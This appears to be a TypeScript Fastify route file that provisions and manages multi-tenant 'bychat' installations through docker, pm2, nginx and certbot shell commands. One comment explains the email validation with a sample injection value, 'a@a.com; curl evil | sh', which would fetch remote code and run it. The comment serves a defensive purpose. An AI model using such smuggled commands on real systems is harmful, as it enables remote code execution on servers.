import { FastifyInstance } from 'fastify'
import { execSync, exec } from 'child_process'
import { existsSync, readFileSync, writeFileSync, mkdirSync, cpSync, rmSync } from 'fs'
import { resolve } from 'path'
import { superadminOnly } from '../lib/auth.js'

// ── Helpers ──────────────────────────────

function sanitizeSub(sub: string): string {
  const clean = sub.replace(/[^a-z0-9-]/g, '')
  if (!clean || clean.length > 63) throw new Error('Subdomínio inválido')
  return clean
}

function run(cmd: string, opts?: { timeout?: number; cwd?: string }): string {
  try {
    return execSync(cmd, {
      encoding: 'utf-8',
      timeout: opts?.timeout || 30000,
      cwd: opts?.cwd,
      stdio: ['pipe', 'pipe', 'pipe'],
    }).trim()
  } catch (e: any) {
    return e.stderr?.trim() || e.message || ''
  }
}

function runAsync(cmd: string, cwd?: string): Promise<{ stdout: string; stderr: string; code: number }> {
  return new Promise((resolve) => {
    exec(cmd, { cwd, timeout: 120000, maxBuffer: 5 * 1024 * 1024 }, (err, stdout, stderr) => {
      resolve({ stdout: stdout?.trim() || '', stderr: stderr?.trim() || '', code: err?.code || 0 })
    })
  })
}

function findFreePort(start: number): number {
  let port = start
  while (true) {
    const result = run(`ss -tlnp | grep ':${port} '`)
    if (!result) return port
    port++
  }
}

function generatePassword(len = 16): string {
  return execSync(`openssl rand -base64 ${len * 2}`, { encoding: 'utf-8' })
    .trim()
    .replace(/[/+=]/g, '')
    .slice(0, len)
}

// ── Types ────────────────────────────────

interface Installation {
  subdomain: string
  domain: string
  dir: string
  appPort: number
  mysqlPort: number
  mysqlContainer: string
  pm2Name: string
  status: 'online' | 'stopped' | 'errored' | 'not_found'
  health: boolean
  ssl: boolean
  createdAt?: string
}

interface ProvisionRequest {
  subdomain: string
  adminEmail?: string
  adminPass?: string
  evolutionUrl?: string
  evolutionKey?: string
  evolutionInstance?: string
  whatsappNumber?: string
  resendKey?: string
  anthropicKey?: string
  openaiKey?: string
}

// ── Core functions ───────────────────────

function getProjectSource(): string {
  // O diretório fonte é a instalação master
  const masterDir = resolve(process.cwd(), '..')
  if (existsSync(resolve(masterDir, 'backend')) && existsSync(resolve(masterDir, 'frontend'))) {
    return masterDir
  }
  // Fallback: diretório do installer
  const installerProject = resolve(masterDir, 'installer/project')
  if (existsSync(installerProject)) return installerProject
  return masterDir
}

/**
 * Lê o domain real do .env do tenant (APP_URL ou MARKETING_HOST).
 * Cai pra `<sub>.bychat.ia.br` se nada estiver configurado.
 *
 * Importante pra tenant principal (beyond): o domain é "bychat.ia.br",
 * não "beyond.bychat.ia.br". Sem isso, a UI mostrava o subdomain como
 * host fictício e o cert SSL aparecia ausente.
 */
function resolveDomain(sub: string, envContent?: string | null): string {
  const fallback = `${sub}.bychat.ia.br`
  if (!envContent) return fallback
  const appUrlMatch = envContent.match(/^APP_URL=["']?https?:\/\/([^"'\s/]+)/m)
  if (appUrlMatch?.[1]) return appUrlMatch[1].trim()
  const marketingMatch = envContent.match(/^MARKETING_HOST=["']?([^"'\s]+)/m)
  if (marketingMatch?.[1]) return marketingMatch[1].trim().replace(/^["']|["']$/g, '')
  return fallback
}

function readEnvFile(dir: string): string | null {
  try {
    return readFileSync(`${dir}/backend/.env`, 'utf-8')
  } catch { return null }
}

function listInstallations(): Installation[] {
  const installations: Installation[] = []

  // Source of truth: diretórios /var/www/bychat-* — uma instalação só é
  // válida se tem código nesse caminho. Processos PM2 órfãos (watchers,
  // queues, etc) NÃO contam como tenant.
  const subdomains = new Set<string>()
  const dirOutput = run('ls -d /var/www/bychat-*/ 2>/dev/null')
  for (const d of dirOutput.split('\n').filter(Boolean)) {
    const sub = d.replace('/var/www/bychat-', '').replace(/\/$/, '')
    // Sub válido = identificador simples sem hífens internos suspeitos
    // (`beyond-frontend-watch` não passaria, mas também não tem dir próprio,
    // então a verificação aqui é só defensiva).
    if (sub && /^[a-z0-9]+$/.test(sub)) subdomains.add(sub)
  }

  // PM2 list — usado SOMENTE para status (não pra descobrir tenants).
  let pm2List: any[] = []
  try {
    const raw = run('pm2 jlist', { timeout: 10000 })
    pm2List = JSON.parse(raw)
  } catch { /* ignore */ }

  for (const sub of subdomains) {
    const dir = `/var/www/bychat-${sub}`
    const pm2Name = `bychat-${sub}`
    const mysqlContainer = `bychat-mysql-${sub}`

    // Lê .env uma vez — usado pra port, domain e createdAt.
    const env = readEnvFile(dir)
    const domain = resolveDomain(sub, env)

    let appPort = 0
    let createdAt: string | undefined
    if (env) {
      const portMatch = env.match(/^PORT=(\d+)/m)
      appPort = portMatch ? parseInt(portMatch[1]) : 0
      const dateMatch = env.match(/Gerado pelo instalador em (.+)/)
      createdAt = dateMatch?.[1]
    }

    // PM2 status — match EXATO do nome (não pega `bychat-beyond-frontend-watch`).
    const proc = pm2List.find((p: any) => p.name === pm2Name)
    let status: Installation['status'] = 'not_found'
    if (proc) {
      const st = proc.pm2_env?.status
      status = st === 'online' ? 'online' : st === 'stopped' ? 'stopped' : 'errored'
    }

    // MySQL port (se houver container associado — tenant principal pode usar
    // outro DB e o container não existir).
    let mysqlPort = 0
    const dockerPort = run(`docker port ${mysqlContainer} 3306 2>/dev/null`)
    const portMatch = dockerPort.match(/:(\d+)/)
    mysqlPort = portMatch ? parseInt(portMatch[1]) : 0

    // Health check local — bate em /api/health na porta do app.
    let health = false
    if (appPort && status === 'online') {
      const code = run(`curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:${appPort}/api/health 2>/dev/null`)
      health = code === '200'
    }

    // SSL — checa o domain real (bychat.ia.br para o principal, terram.bychat.ia.br etc.)
    const ssl = existsSync(`/etc/letsencrypt/live/${domain}/fullchain.pem`)

    installations.push({
      subdomain: sub,
      domain,
      dir,
      appPort,
      mysqlPort,
      mysqlContainer,
      pm2Name,
      status,
      health,
      ssl,
      createdAt,
    })
  }

  return installations.sort((a, b) => a.subdomain.localeCompare(b.subdomain))
}

async function provision(data: ProvisionRequest, logFn: (msg: string) => void): Promise<{ success: boolean; error?: string; credentials?: any }> {
  const sub = data.subdomain.toLowerCase().replace(/[^a-z0-9-]/g, '')
  if (!sub) return { success: false, error: 'Subdomínio inválido' }

  const domain = `${sub}.bychat.ia.br`
  const dir = `/var/www/bychat-${sub}`
  const mysqlContainer = `bychat-mysql-${sub}`
  const pm2Name = `bychat-${sub}`

  const appPort = findFreePort(3100)
  const mysqlPort = findFreePort(3307)
  const mysqlRootPass = generatePassword(20)
  const mysqlPass = generatePassword(20)
  const jwtSecret = execSync('openssl rand -base64 48', { encoding: 'utf-8' }).trim()
  const adminPass = data.adminPass || generatePassword(12)
  const adminEmail = data.adminEmail || 'admin@bychat.ia.br'
  // adminEmail é interpolado em comandos de shell (certbot) e escrito no .env.
  // Validação estrita (charset seguro, sem metacaracteres de shell) impede
  // command injection — ex.: "a@a.com; curl evil | sh".
  if (!/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(adminEmail) || adminEmail.length > 254) {
    return { success: false, error: 'E-mail do administrador inválido' }
  }
  const installDate = new Date().toISOString().replace('T', ' ').slice(0, 19)

  try {
    // 1. MySQL container
    logFn('Criando container MySQL...')
    mkdirSync(dir, { recursive: true })

    const composeContent = readFileSync(resolve(getProjectSource(), 'installer/templates/docker-compose.yml'), 'utf-8')
      .replace(/\{\{SUBDOMAIN\}\}/g, sub)
      .replace(/\{\{MYSQL_ROOT_PASS\}\}/g, mysqlRootPass)
      .replace(/\{\{MYSQL_PASS\}\}/g, mysqlPass)
      .replace(/\{\{MYSQL_PORT\}\}/g, String(mysqlPort))
    writeFileSync(`${dir}/docker-compose.yml`, composeContent)

    const dcResult = await runAsync('docker compose up -d', dir)
    if (dcResult.code) {
      return { success: false, error: `Docker compose falhou: ${dcResult.stderr}` }
    }

    // Aguardar MySQL
    logFn('Aguardando MySQL...')
    for (let i = 0; i < 30; i++) {
      const ping = run(`docker exec ${mysqlContainer} mysqladmin ping -h localhost -u root -p'${mysqlRootPass}' --silent 2>/dev/null`)
      if (ping.includes('alive')) break
      await new Promise(r => setTimeout(r, 2000))
      if (i === 29) return { success: false, error: 'MySQL não iniciou em 60s' }
    }

    // 2. Copiar projeto
    logFn('Copiando arquivos do projeto...')
    const src = getProjectSource()
    cpSync(`${src}/backend`, `${dir}/backend`, { recursive: true, filter: (s) => !s.includes('node_modules') && !s.includes('/dist/') && !s.includes('.env') })
    cpSync(`${src}/frontend`, `${dir}/frontend`, { recursive: true })
    mkdirSync(`${dir}/uploads`, { recursive: true })

    // 3. Gerar .env
    logFn('Gerando configuração...')
    const envTemplate = readFileSync(resolve(src, 'installer/templates/env.template'), 'utf-8')
    const envContent = envTemplate
      .replace(/\{\{SUBDOMAIN\}\}/g, sub)
      .replace(/\{\{MYSQL_PASS\}\}/g, mysqlPass)
      .replace(/\{\{MYSQL_PORT\}\}/g, String(mysqlPort))
      .replace(/\{\{EVOLUTION_URL\}\}/g, data.evolutionUrl || '')
      .replace(/\{\{EVOLUTION_KEY\}\}/g, data.evolutionKey || '')
      .replace(/\{\{EVOLUTION_INSTANCE\}\}/g, data.evolutionInstance || '')
      .replace(/\{\{WHATSAPP_NUMBER\}\}/g, data.whatsappNumber || '')
      .replace(/\{\{RESEND_KEY\}\}/g, data.resendKey || '')
      .replace(/\{\{NOTIFY_EMAIL\}\}/g, adminEmail)
      .replace(/\{\{APP_PORT\}\}/g, String(appPort))
      .replace(/\{\{ADMIN_PASS\}\}/g, adminPass)
      .replace(/\{\{JWT_SECRET\}\}/g, jwtSecret)
      .replace(/\{\{ANTHROPIC_KEY\}\}/g, data.anthropicKey || '')
      .replace(/\{\{OPENAI_KEY\}\}/g, data.openaiKey || '')
      .replace(/\{\{INSTALL_DATE\}\}/g, installDate)
    writeFileSync(`${dir}/backend/.env`, envContent)

    // 4. Gerar ecosystem
    const ecoTemplate = readFileSync(resolve(src, 'installer/templates/ecosystem.template.cjs'), 'utf-8')
    const ecoContent = ecoTemplate
      .replace(/\{\{SUBDOMAIN\}\}/g, sub)
      .replace(/\{\{APP_PORT\}\}/g, String(appPort))
    writeFileSync(`${dir}/ecosystem.config.cjs`, ecoContent)

    // 5. npm install + prisma
    logFn('Instalando dependências (npm install)...')
    const npmResult = await runAsync('npm install --omit=dev 2>&1', `${dir}/backend`)
    if (npmResult.code) {
      return { success: false, error: `npm install falhou: ${npmResult.stderr || npmResult.stdout}` }
    }

    await runAsync('npm install -D prisma tsx typescript 2>&1', `${dir}/backend`)

    logFn('Configurando banco de dados (Prisma)...')
    await runAsync('npx prisma generate 2>&1', `${dir}/backend`)
    const migrateResult = await runAsync('npx prisma migrate deploy 2>&1', `${dir}/backend`)
    if (migrateResult.stdout.includes('Error') && !migrateResult.stdout.includes('already applied')) {
      return { success: false, error: `Prisma migrate falhou: ${migrateResult.stdout}` }
    }

    // 6. Nginx
    logFn('Configurando Nginx...')
    const nginxTemplate = readFileSync(resolve(src, 'installer/templates/nginx.template'), 'utf-8')
    const nginxContent = nginxTemplate
      .replace(/\{\{SUBDOMAIN\}\}/g, sub)
      .replace(/\{\{APP_PORT\}\}/g, String(appPort))
    const nginxPath = `/etc/nginx/sites-available/bychat-${sub}`
    writeFileSync(nginxPath, nginxContent)
    run(`ln -sf ${nginxPath} /etc/nginx/sites-enabled/bychat-${sub}`)
    const nginxTest = run('nginx -t 2>&1')
    if (!nginxTest.includes('successful')) {
      return { success: false, error: `Nginx config inválida: ${nginxTest}` }
    }
    run('systemctl reload nginx')

    // 7. PM2
    logFn('Iniciando aplicação...')
    run(`pm2 start ecosystem.config.cjs --env production 2>&1`, { cwd: dir })
    run('pm2 save 2>&1')

    await new Promise(r => setTimeout(r, 5000))

    // 8. Health check
    const health = run(`curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:${appPort}/api/health 2>/dev/null`)

    // 9. SSL (tentar)
    logFn('Verificando DNS e SSL...')
    let ssl = false
    const myIp = run('curl -4 -s --max-time 5 ifconfig.me 2>/dev/null')
    const dnsIp = run(`dig +short ${domain} A 2>/dev/null`).split('\n')[0]

    if (dnsIp === myIp) {
      const certResult = await runAsync(`certbot --nginx -d ${domain} --non-interactive --agree-tos --email ${adminEmail} 2>&1`)
      ssl = !certResult.stderr.includes('Error') && certResult.code === 0
    }

    logFn('Concluído!')

    return {
      success: true,
      credentials: {
        subdomain: sub,
        domain,
        url: `${ssl ? 'https' : 'http'}://${domain}`,
        adminEmail,
        adminPass,
        appPort,
        mysqlPort,
        mysqlContainer,
        mysqlUser: 'bychat_user',
        mysqlPass,
        mysqlRootPass,
        pm2Name,
        dir,
        ssl,
        health: health === '200',
        dnsOk: dnsIp === myIp,
        serverIp: myIp,
      },
    }
  } catch (e: any) {
    return { success: false, error: e.message }
  }
}

// ── Routes ───────────────────────────────

export async function installationsRoutes(app: FastifyInstance) {

  // GET /api/admin/installations — Listar todas
  app.get('/api/admin/installations', { preHandler: superadminOnly }, async () => {
    const installations = listInstallations()
    return { installations }
  })

  // POST /api/admin/installations — Provisionar nova
  app.post('/api/admin/installations', { preHandler: superadminOnly }, async (req, reply) => {
    const data = req.body as ProvisionRequest

    if (!data.subdomain) {
      return reply.code(400).send({ error: 'Subdomínio obrigatório' })
    }

    const sub = data.subdomain.toLowerCase().replace(/[^a-z0-9-]/g, '')
    if (!sub || sub.length < 2) {
      return reply.code(400).send({ error: 'Subdomínio deve ter pelo menos 2 caracteres (letras, números e hífens)' })
    }

    if (existsSync(`/var/www/bychat-${sub}`)) {
      return reply.code(409).send({ error: `Já existe instalação para "${sub}"` })
    }

    // Executar provisionamento (pode demorar ~60s)
    const logs: string[] = []
    const result = await provision(data, (msg) => { logs.push(msg) })

    if (result.success) {
      return { success: true, credentials: result.credentials, logs }
    } else {
      return reply.code(500).send({ error: result.error, logs })
    }
  })

  // POST /api/admin/installations/:sub/restart — Restart PM2
  app.post('/api/admin/installations/:sub/restart', { preHandler: superadminOnly }, async (req) => {
    const sub = sanitizeSub((req.params as { sub: string }).sub)
    const pm2Name = `bychat-${sub}`
    const result = run(`pm2 restart ${pm2Name} 2>&1`)
    return { ok: !result.includes('not found'), output: result }
  })

  // POST /api/admin/installations/:sub/stop — Stop PM2
  app.post('/api/admin/installations/:sub/stop', { preHandler: superadminOnly }, async (req) => {
    const sub = sanitizeSub((req.params as { sub: string }).sub)
    const result = run(`pm2 stop bychat-${sub} 2>&1`)
    return { ok: !result.includes('not found'), output: result }
  })

  // POST /api/admin/installations/:sub/start — Start PM2
  app.post('/api/admin/installations/:sub/start', { preHandler: superadminOnly }, async (req) => {
    const sub = sanitizeSub((req.params as { sub: string }).sub)
    const dir = `/var/www/bychat-${sub}`
    if (!existsSync(`${dir}/ecosystem.config.cjs`)) {
      return { ok: false, output: 'Instalação não encontrada' }
    }
    const result = run(`pm2 start ecosystem.config.cjs --env production 2>&1`, { cwd: dir })
    return { ok: true, output: result }
  })

  // POST /api/admin/installations/:sub/ssl — Gerar/renovar SSL
  app.post('/api/admin/installations/:sub/ssl', { preHandler: superadminOnly }, async (req) => {
    const sub = sanitizeSub((req.params as { sub: string }).sub)
    // Lê domain real do .env (tenant principal usa bychat.ia.br, não beyond.bychat.ia.br).
    const env = readEnvFile(`/var/www/bychat-${sub}`)
    const domain = resolveDomain(sub, env)

    // Verificar DNS primeiro
    const myIp = run('curl -4 -s --max-time 5 ifconfig.me 2>/dev/null')
    const dnsIp = run(`dig +short ${domain} A 2>/dev/null`).split('\n')[0]

    if (!dnsIp) {
      return { ok: false, error: 'DNS não resolve', detail: `Configure registro A: ${domain} → ${myIp}` }
    }
    if (dnsIp !== myIp) {
      return { ok: false, error: 'DNS aponta para outro IP', detail: `${domain} → ${dnsIp} (esperado: ${myIp})` }
    }

    const result = run(`certbot --nginx -d ${domain} --non-interactive --agree-tos --email admin@bychat.ia.br 2>&1`, { timeout: 60000 })
    const success = result.includes('Successfully') || result.includes('Certificate not yet due for renewal')

    return { ok: success, output: result }
  })

  // GET /api/admin/installations/:sub/logs — Últimas linhas de log
  app.get('/api/admin/installations/:sub/logs', { preHandler: superadminOnly }, async (req) => {
    const sub = sanitizeSub((req.params as { sub: string }).sub)
    const logs = run(`pm2 logs bychat-${sub} --lines 50 --nostream 2>&1`, { timeout: 5000 })
    return { logs }
  })

  // DELETE /api/admin/installations/:sub — Desinstalar
  app.delete('/api/admin/installations/:sub', { preHandler: superadminOnly }, async (req, reply) => {
    const sub = sanitizeSub((req.params as { sub: string }).sub)
    const dir = `/var/www/bychat-${sub}`
    const pm2Name = `bychat-${sub}`
    const mysqlContainer = `bychat-mysql-${sub}`

    if (!existsSync(dir)) {
      return reply.code(404).send({ error: 'Instalação não encontrada' })
    }

    const steps: string[] = []

    // 1. Parar e remover PM2
    run(`pm2 delete ${pm2Name} 2>&1`)
    run('pm2 save 2>&1')
    steps.push('PM2 removido')

    // 2. Parar e remover container MySQL + volume
    run(`docker compose down -v 2>&1`, { cwd: dir })
    steps.push('MySQL container removido')

    // 3. Remover Nginx config
    run(`rm -f /etc/nginx/sites-enabled/bychat-${sub}`)
    run(`rm -f /etc/nginx/sites-available/bychat-${sub}`)
    run('nginx -t 2>&1 && systemctl reload nginx')
    steps.push('Nginx removido')

    // 4. Remover diretório
    rmSync(dir, { recursive: true, force: true })
    steps.push('Diretório removido')

    // 5. Revogar SSL se existir
    const domain = `${sub}.bychat.ia.br`
    if (existsSync(`/etc/letsencrypt/live/${domain}`)) {
      run(`certbot delete --cert-name ${domain} --non-interactive 2>&1`)
      steps.push('SSL revogado')
    }

    return { ok: true, steps }
  })
}
